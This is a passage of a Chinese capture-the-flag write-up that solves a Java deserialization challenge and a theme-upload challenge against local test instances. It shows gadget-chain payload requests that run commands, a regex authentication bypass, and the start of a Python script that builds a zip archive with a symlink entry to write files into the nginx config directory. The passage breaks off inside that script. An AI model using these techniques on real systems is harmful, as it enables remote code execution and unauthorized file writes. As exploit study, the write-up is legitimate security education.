+<p>TemplatesImpl 允许通过 _bytecodes 属性传入十六进制的类字节码。一旦被触发，它会加载并实例化攻击者传入的任意恶意 Java 类</p>
+<p>AbstractTranslet 通常是攻击类需要继承的父类，所以也被一起封杀了</p>
+<p>3.二次反序列化与绕过</p>
+<pre><code class="hljs java">java.security.SignedObject</code></pre>
+
+<p>它本质上是一个“包装盒”，可以把另一个对象序列化后封存在里面。</p>
+<p>常利用它来绕过某些基于黑名单的 ObjectInputStream 检查：因为 SignedObject 在被调用 getObject() 时，内部会开启一个新的 ObjectInputStream 进行二次反序列化，如果只检查了第一层，就会被它绕过去。</p>
+<p>4.远程调用与 JNDI 注入</p>
+<pre><code class="hljs java">javax.management.remote.rmi.RMIConnector</code></pre>
+
+<p>可以触发 lookup 操作，引导服务器去请求一个远程的恶意恶意地，从而加载外部的恶意代码。</p>
+<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>
+
+<p>可以打CommonsCollections3（CC3）链，注意黑名单是过滤了TemplatesImpl了的，所以在java-chains里面得用<strong>CommonsCollectionsK3(CC3.2.1 ChainedTransformer 链)</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>Yakit请求包一：</p>
+<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0
+<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1
+<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;147&quot;, &quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;147&quot;
+<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9
+<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
+<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;
+<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+
+<span class="language-handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">base64dec</span>(<span class="hljs-name">生成的base64数据</span>)&#125;&#125;</span></span></code></pre>
+
+<p>返回：</p>
+<pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span>
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 07 May 2026 16:44:42 GMT
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23
+
+<span class="language-ebnf"><span class="hljs-attribute">deserialization success</span></span></code></pre>
+
+<p>说明反序列化成功了，不过没有回显，用<strong>JegGadget(调用 Jeg 生成回显字节码)</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>Yakit请求包二：</p>
+<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9
+<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;147&quot;, &quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;147&quot;
+<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache
+<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate
+<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none
+<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
+<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd
+<span class="hljs-attribute">X-Authorization</span><span class="hljs-punctuation">: </span>pwd
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream
+
+<span class="language-handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">base64dec</span>(<span class="hljs-name">生成的base64数据</span>)&#125;&#125;</span></span></code></pre>
+
+<p>命令执行的地方在：</p>
+<pre><code class="hljs plaintext">X-Authorization: pwd</code></pre>
+
+<p>这里的Content-Type要修改，本地测试的application&#x2F;octet-stream和application&#x2F;json是可行的</p>
+<p>回显：</p>
+<pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span>
+<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 07 May 2026 16:47:33 GMT
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5
+
+<span class="language-bash">/app</span></code></pre>
+
+<h2 id="ThemeSync"><a href="#ThemeSync" class="headerlink" title="ThemeSync"></a>ThemeSync</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地跑附件源码，提前放一个flag在flags目录下</p>
+<pre><code class="hljs sh">wolf@wolf:~/ctf/web/ThemeSync/docker/files$ <span class="hljs-built_in">cd</span> flag
+wolf@wolf:~/ctf/web/ThemeSync/docker/files/flag$ <span class="hljs-built_in">ls</span>
+wolf@wolf:~/ctf/web/ThemeSync/docker/files/flag$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;flag&#123;local_test&#125;&#x27;</span> &gt; flag.txt
+wolf@wolf:~/ctf/web/ThemeSync/docker/files/flag$ <span class="hljs-built_in">ls</span>
+flag.txt
+wolf@wolf:~/ctf/web/ThemeSync/docker/files/flag$ <span class="hljs-built_in">cat</span> flag.txt
+flag&#123;local_test&#125;
+wolf@wolf:~/ctf/web/ThemeSync/docker/files/flag$ <span class="hljs-built_in">cd</span> ..
+wolf@wolf:~/ctf/web/ThemeSync/docker/files$ <span class="hljs-built_in">cd</span> ..
+wolf@wolf:~/ctf/web/ThemeSync/docker$ docker compose up --build
+[+] Building 101.7s (14/14) FINISHED
+......</code></pre>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>主题包上传服务 ，首页返回了一些接口，有些接口直接访问有鉴权，后续要对jar包进行分析</p>
+<h3 id="绕过鉴权"><a href="#绕过鉴权" class="headerlink" title="绕过鉴权"></a>绕过鉴权</h3><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> request.getRequestURI();
+        <span class="hljs-keyword">if</span> (!requestPath.startsWith(PROTECTED_PREFIX)) &#123;
+            filterChain.doFilter(request, response);
+            <span class="hljs-comment">//PROTECTED_PREFIX就是/api/v2/preview/，如果路由开头不是/api/v2/preview/，就直接放行</span>
+        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.authPattern.matcher(buildAuthCandidate(request)).matches()) &#123;
+            filterChain.doFilter(request, response);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            response.setStatus(<span class="hljs-number">403</span>);
+            response.getWriter().write(<span class="hljs-string">&quot;blocked by regex auth&quot;</span>);
+        &#125;
+    &#125;</code></pre>
+
+<p>看到这一句：</p>
+<pre><code class="hljs java"><span class="hljs-built_in">this</span>.authPattern.matcher(buildAuthCandidate(request)).matches()</code></pre>
+
+<p>将我们的请求在this.authPattern这个正则前匹配，匹配成功就放行，不然就报403</p>
+<p>这时候去找这个正则匹配，在BOOT-INF&#x2F;classes&#x2F;application.yml</p>
+<pre><code class="hljs yml"><span class="hljs-attr">server:</span>
+  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
+
+<span class="hljs-attr">spring:</span>
+  <span class="hljs-attr">servlet:</span>
+    <span class="hljs-attr">multipart:</span>
+      <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">20MB</span>
+      <span class="hljs-attr">max-request-size:</span> <span class="hljs-string">20MB</span>
+
+<span class="hljs-attr">challenge:</span>
+  <span class="hljs-attr">auth-pattern:</span> <span class="hljs-string">&quot;^/api/v2/preview/[A-Za-z]+.*?/download$&quot;</span>
+  <span class="hljs-attr">workspace-root:</span> <span class="hljs-string">&quot;/tmp/ez-nginx/imports&quot;</span>
+  <span class="hljs-attr">reload-script:</span> <span class="hljs-string">&quot;/usr/local/bin/reload-nginx.sh&quot;</span>
+  <span class="hljs-attr">dynamic-config-path:</span> <span class="hljs-string">&quot;/usr/local/openresty/nginx/conf/snippets/ez-dynamic.conf&quot;</span></code></pre>
+
+<p><code>^</code> (匹配行首</p>
+<p><code>/api/v2/preview/</code> 请求以这个路径开头</p>
+<p><code>[A-Za-z]+</code>匹配任何大写或小写的英文字母且至少出现一次</p>
+<p><code>.\*?</code></p>
+<p><code>.</code> 代表匹配除换行符以外的<strong>任意字符</strong>。</p>
+<p><code>*</code> 代表前面的字符可以出现<strong>0次或无数次</strong>。</p>
+<p><code>?</code> 开启“懒惰模式”</p>
+<p><code>/download$</code> 保证 <code>/download</code> 必须是整个字符串的最后部分</p>
+<p><code>buildAuthCandidate(request)</code>这个会将整个请求路径都带进去匹配，包括参数</p>
+<pre><code class="hljs java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildAuthCandidate</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> request.getQueryString();<span class="hljs-comment">//获取参数</span>
+        <span class="hljs-keyword">if</span> (query == <span class="hljs-literal">null</span> || query.isEmpty()) &#123;
+            <span class="hljs-keyword">return</span> request.getRequestURI();
+        &#125;
+        <span class="hljs-keyword">return</span> request.getRequestURI() + CallerData.NA + query;
+    <span class="hljs-comment">//CallerData.NA是?，拼接url和请求参数</span>
+    &#125;</code></pre>
+
+<p>那么在正则匹配过了之后，spring mvc获取路由的时候url和参数是分开的，那这个时候就能通过这个差异绕过了这个鉴权，只要保证结尾是&#x2F;download即可，比如</p>
+<pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">Admin</span>&gt;<span class="hljs-title">curl</span> <span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">api</span>/<span class="hljs-title">v2</span>/<span class="hljs-title">preview</span>/<span class="hljs-title">admin</span>/<span class="hljs-title">sync</span>/<span class="hljs-title">job</span></span>
+<span class="hljs-function"><span class="hljs-title">blocked</span> <span class="hljs-title">by</span> <span class="hljs-title">regex</span> <span class="hljs-title">auth</span></span>
+<span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Admin</span>&gt;<span class="hljs-title">curl</span> <span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">api</span>/<span class="hljs-title">v2</span>/<span class="hljs-title">preview</span>/<span class="hljs-title">admin</span>/<span class="hljs-title">sync</span>/<span class="hljs-title">job</span>?<span class="hljs-title">x</span>=/<span class="hljs-title">download</span></span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">workspace</span>&quot;:&quot;/<span class="hljs-title">tmp</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">nginx</span>/<span class="hljs-title">imports</span>&quot;,&quot;<span class="hljs-title">targetConfig</span>&quot;:&quot;/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">openresty</span>/<span class="hljs-title">nginx</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">snippets</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">dynamic.conf</span>&quot;,&quot;<span class="hljs-title">field</span>&quot;:&quot;<span class="hljs-title">package</span>&quot;,&quot;<span class="hljs-title">lastOperator</span>&quot;:&quot;<span class="hljs-title">ops</span>-<span class="hljs-title">bot</span>&quot;&#125;</span>
+<span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Admin</span>&gt;</span></code></pre>
+
+<p>现在可以确定鉴权能绕过，上传字段名是 package，工作目录是 &#x2F;tmp&#x2F;ez-nginx&#x2F;imports</p>
+<h3 id="上传分析"><a href="#上传分析" class="headerlink" title="上传分析"></a>上传分析</h3><p>找一下文件上传的逻辑</p>
+<pre><code class="hljs java"><span class="hljs-meta">@PostMapping(value = &#123;&quot;/api/v2/preview/admin/sync/upload&quot;&#125;, consumes = &#123;&quot;multipart/form-data&quot;&#125;)</span>
+    <span class="hljs-keyword">public</span> ImportResult <span class="hljs-title function_">sync</span><span class="hljs-params">(<span class="hljs-meta">@RequestPart(&quot;package&quot;)</span> MultipartFile packageFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.themePackageService.accept(packageFile);
+    &#125;</code></pre>
+
+<p>上传点在&#x2F;api&#x2F;v2&#x2F;preview&#x2F;admin&#x2F;sync&#x2F;upload，用POST方式，格式为multipart&#x2F;form-data，表单命名为package</p>
+<p>分析一下这个上传具体逻辑：</p>
+<pre><code class="hljs java"><span class="hljs-comment">/* JADX INFO: loaded from: ez-nginx.jar:BOOT-INF/classes/com/example/eznginx/service/ThemePackageServiceImpl.class */</span>
+<span class="hljs-meta">@Service</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThemePackageServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ThemePackageService</span> &#123;
+    <span class="hljs-comment">//对ThemePackageService的具体实现，可以看到accept实现的具体逻辑</span>
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IMPORT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;import-&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ARCHIVE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;package.zip&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXTRACT_DIR_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;unpacked&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ZIP_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.zip&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChallengeProperties properties;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuntimeConfigService runtimeConfigService;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ThemePackageServiceImpl</span><span class="hljs-params">(ChallengeProperties properties, RuntimeConfigService runtimeConfigService)</span> &#123;
+        <span class="hljs-built_in">this</span>.properties = properties;
+        <span class="hljs-built_in">this</span>.runtimeConfigService = runtimeConfigService;
+    &#125;
+    <span class="hljs-comment">//依赖注入</span>
+
+    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// com.example.eznginx.service.ThemePackageService</span>
+    <span class="hljs-keyword">public</span> ImportResult <span class="hljs-title function_">accept</span><span class="hljs-params">(MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        validateArchive(file);
+        <span class="hljs-type">Path</span> <span class="hljs-variable">workspaceRoot</span> <span class="hljs-operator">=</span> ensureDirectory(Paths.get(<span class="hljs-built_in">this</span>.properties.getWorkspaceRoot(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]));
+        <span class="hljs-type">Path</span> <span class="hljs-variable">sessionRoot</span> <span class="hljs-operator">=</span> Files.createTempDirectory(workspaceRoot, IMPORT_PREFIX, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileAttribute</span>[<span class="hljs-number">0</span>]);
+        <span class="hljs-type">Path</span> <span class="hljs-variable">archivePath</span> <span class="hljs-operator">=</span> storeArchive(file, sessionRoot);
+        <span class="hljs-type">Path</span> <span class="hljs-variable">extractRoot</span> <span class="hljs-operator">=</span> ensureDirectory(sessionRoot.resolve(EXTRACT_DIR_NAME));
+        extractArchive(archivePath, extractRoot);
+        <span class="hljs-built_in">this</span>.runtimeConfigService.refresh();
+        <span class="hljs-comment">//刷新配置</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportResult</span>(sessionRoot.toString(), <span class="hljs-built_in">this</span>.properties.getDynamicConfigPath(), <span class="hljs-literal">true</span>);
+        
+    &#125;</code></pre>
+
+<p>先进行一次validateArchive(file)检验</p>
+<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateArchive</span><span class="hljs-params">(MultipartFile archive)</span> &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> archive.getOriginalFilename();<span class="hljs-comment">//获取原始名称</span>
+        <span class="hljs-keyword">if</span> (archive.isEmpty() || filename == <span class="hljs-literal">null</span> || !filename.endsWith(ZIP_SUFFIX)) &#123;
+            <span class="hljs-comment">//压缩包不能为空，文件名不能为空，后缀要是zip</span>
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;package must be a non-empty zip file&quot;</span>);
+        &#125;
+    &#125;</code></pre>
+
+<p>确保&#x2F;tmp&#x2F;ez-nginx&#x2F;imports目录存在，不存在就创建</p>
+<pre><code class="hljs java"><span class="hljs-type">Path</span> <span class="hljs-variable">workspaceRoot</span> <span class="hljs-operator">=</span> ensureDirectory(Paths.get(<span class="hljs-built_in">this</span>.properties.getWorkspaceRoot(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]));</code></pre>
+
+<p>创建临时会话目录，在&#x2F;tmp&#x2F;ez-nginx&#x2F;imports下，前缀为import-，例如得到&#x2F;tmp&#x2F;ez-nginx&#x2F;imports&#x2F;import-1234567890这样的目录</p>
+<pre><code class="hljs java"><span class="hljs-type">Path</span> <span class="hljs-variable">sessionRoot</span> <span class="hljs-operator">=</span> Files.createTempDirectory(workspaceRoot, IMPORT_PREFIX, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileAttribute</span>[<span class="hljs-number">0</span>]);</code></pre>
+
+<p>然后就是讲上传内容保存到刚刚临时目录下的package.zip内，这里仅仅只是做保存，未作防护</p>
+<pre><code class="hljs java"><span class="hljs-type">Path</span> <span class="hljs-variable">archivePath</span> <span class="hljs-operator">=</span> storeArchive(file, sessionRoot);</code></pre>
+
+<p>然后是确定解压目录，在刚刚临时目录下的unpacked文件夹内</p>
+<pre><code class="hljs java"><span class="hljs-type">Path</span> <span class="hljs-variable">extractRoot</span> <span class="hljs-operator">=</span> ensureDirectory(sessionRoot.resolve(EXTRACT_DIR_NAME));</code></pre>
+
+<p>再将刚刚村的package.zip解压到刚刚创建的解压目录下</p>
+<pre><code class="hljs java">extractArchive(archivePath, extractRoot);</code></pre>
+
+<p>这里我们看一下extractArchive的逻辑</p>
+<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">extractArchive</span><span class="hljs-params">(Path archivePath, Path extractRoot)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(archivePath.toFile());
+        <span class="hljs-keyword">try</span> &#123;
+            Enumeration&lt;ZipArchiveEntry&gt; entries = zipFile.getEntries();
+            <span class="hljs-keyword">while</span> (entries.hasMoreElements()) &#123;
+                <span class="hljs-type">ZipArchiveEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> entries.nextElement();
+                extractEntry(zipFile, entry, extractRoot);
+            &#125;
+            zipFile.close();
+        &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;
+            <span class="hljs-keyword">try</span> &#123;
+                zipFile.close();
+            &#125; <span class="hljs-keyword">catch</span> (Throwable th2) &#123;
+                th.addSuppressed(th2);
+            &#125;
+            <span class="hljs-keyword">throw</span> th;
+        &#125;
+    &#125;</code></pre>
+
+<p>遍历这个压缩包里面的每一个条目，用extractEntry方法处理，这种方式是很危险的，看一下extractEntry的逻辑就知道了</p>
+<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">extractEntry</span><span class="hljs-params">(ZipFile zipFile, ZipArchiveEntry entry, Path extractRoot)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">Path</span> <span class="hljs-variable">outputPath</span> <span class="hljs-operator">=</span> resolveOutputPath(extractRoot, entry.getName());
+        <span class="hljs-keyword">if</span> (entry.isDirectory()) &#123;
+            ensureDirectory(outputPath);
+        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.isUnixSymlink()) &#123;
+            writeSymlink(zipFile, entry, outputPath);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            writeRegularFile(zipFile, entry, outputPath);
+        &#125;
+    &#125;
+
+<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeSymlink</span><span class="hljs-params">(ZipFile zipFile, ZipArchiveEntry entry, Path outputPath)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        createParent(outputPath);
+        Files.deleteIfExists(outputPath);
+        <span class="hljs-type">String</span> <span class="hljs-variable">symlinkTarget</span> <span class="hljs-operator">=</span> readSymlinkTarget(zipFile, entry);
+        Files.createSymbolicLink(outputPath, Paths.get(symlinkTarget, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]), <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileAttribute</span>[<span class="hljs-number">0</span>]);
+    &#125;
+
+<span class="hljs-keyword">private</span> Path <span class="hljs-title function_">resolveOutputPath</span><span class="hljs-params">(Path extractRoot, String entryName)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">Path</span> <span class="hljs-variable">outputPath</span> <span class="hljs-operator">=</span> extractRoot.resolve(entryName).normalize();<span class="hljs-comment">//路径脱水，防止路径穿越</span>
+        <span class="hljs-keyword">if</span> (!outputPath.startsWith(extractRoot)) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;illegal archive entry: &quot;</span> + entryName);
+        &#125;
+        <span class="hljs-keyword">return</span> outputPath;
+    &#125;</code></pre>
+
+<p>这里是漏洞核心位置，虽然防止了路径穿越，但是主要的点在entry.isUnixSymlink()这</p>
+<p>对于正常的目录和文件会直接创建或写在硬盘上，如果属性是symlink的话，就会在磁盘创建一个软链接，</p>
+<p>如果此时在这个symlink 目录下再写入别的条目，那么在前面已经创建了恶意软链接，那么就可以做到将文件写入其他目录，或者覆盖原文件</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>此时知道了怎么做，现在开始实操，我们最开始首页就暴露了上传接口，后续分析jar包后可以实现绕过鉴权</p>
+<p>创建一个验证exp：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile
+<span class="hljs-keyword">from</span> stat <span class="hljs-keyword">import</span> S_IFLNK
+
+payload = <span class="hljs-string">b&#x27;&#x27;&#x27;location = /inspect &#123;</span>
+<span class="hljs-string">    default_type text/plain;</span>
+<span class="hljs-string">    return 200 &quot;probe_ok\\n&quot;;</span>
+<span class="hljs-string">&#125;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;probe.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> z:
+    <span class="hljs-comment"># 1. 创建一个 symlink 条目：x -&gt; /usr/local/openresty/nginx/conf/snippets</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;x&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span> <span class="hljs-comment"># 标记为 Unix 系统</span>
+    zi.external_attr = ((S_IFLNK | <span class="hljs-number">0o777</span>) &lt;&lt; <span class="hljs-number">16</span>) <span class="hljs-comment"># 设置为软链接权限</span>
